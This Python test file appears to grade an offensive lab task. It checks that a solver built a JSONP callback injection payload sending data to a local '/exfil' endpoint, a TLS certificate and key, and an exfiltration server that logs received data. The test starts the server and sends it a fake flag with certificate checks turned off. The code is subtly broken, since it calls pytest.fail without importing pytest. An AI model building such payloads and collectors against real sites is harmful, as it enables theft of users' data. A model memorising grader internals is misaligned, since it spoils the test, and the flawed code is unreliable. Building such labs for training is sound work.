# test_final_state.py

import os
import re
import subprocess
import time
import urllib.request
import urllib.error
import ssl

def test_payload_exists_and_matches():
    payload_path = "/home/user/payload.txt"
    assert os.path.isfile(payload_path), f"Payload file {payload_path} does not exist."

    with open(payload_path, "r") as f:
        content = f.read().strip()

    assert content, f"Payload file {payload_path} is empty."

    # Check for script tag pointing to the JSONP endpoint
    assert "/api/status" in content, "Payload does not seem to use the /api/status endpoint for JSONP."
    assert "callback=" in content, "Payload does not use the callback parameter for JSONP."

    # Check for exfiltration destination
    assert "https://127.0.0.1:4443/exfil" in content, "Payload does not exfiltrate to the correct destination."

def test_certificates_exist_and_valid():
    cert_path = "/home/user/exfil_cert.pem"
    key_path = "/home/user/exfil_key.pem"

    assert os.path.isfile(cert_path), f"Certificate file {cert_path} does not exist."
    assert os.path.isfile(key_path), f"Private key file {key_path} does not exist."

    with open(cert_path, "r") as f:
        cert_content = f.read()
    assert "BEGIN CERTIFICATE" in cert_content, f"{cert_path} does not look like a valid PEM certificate."

    with open(key_path, "r") as f:
        key_content = f.read()
    assert "PRIVATE KEY" in key_content, f"{key_path} does not look like a valid PEM private key."

def test_exfil_server_functionality():
    server_path = "/home/user/exfil_server.py"
    log_path = "/home/user/exfil_log.txt"

    assert os.path.isfile(server_path), f"Exfiltration server script {server_path} does not exist."

    # Remove log file if it exists from previous runs
    if os.path.exists(log_path):
        os.remove(log_path)

    # Start the server
    process = subprocess.Popen(
        ["python3", server_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    try:
        # Give the server a moment to start
        time.sleep(2)

        # Ensure process is still running
        assert process.poll() is None, "Exfiltration server failed to start or crashed immediately."

        # Make a request to the server
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        test_data = "FLAG_SUCCESS_TEST_123"
        url = f"https://127.0.0.1:4443/exfil?data={test_data}"

        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, context=ctx, timeout=5) as response:
                assert response.status == 200, f"Server returned status {response.status}, expected 200."
        except urllib.error.URLError as e:
            pytest.fail(f"Failed to connect to the exfiltration server: {e}")

        # Check if the log file was created and contains the correct data
        assert os.path.isfile(log_path), f"Log file {log_path} was not created by the server."

        with open(log_path, "r") as f:
            log_content = f.read().strip()

        assert test_data in log_content, f"Expected data '{test_data}' not found in {log_path}."

    finally:
        # Terminate the server
        process.terminate()
        try:
            process.wait(timeout=3)
        except subprocess.TimeoutExpired:
            process.kill()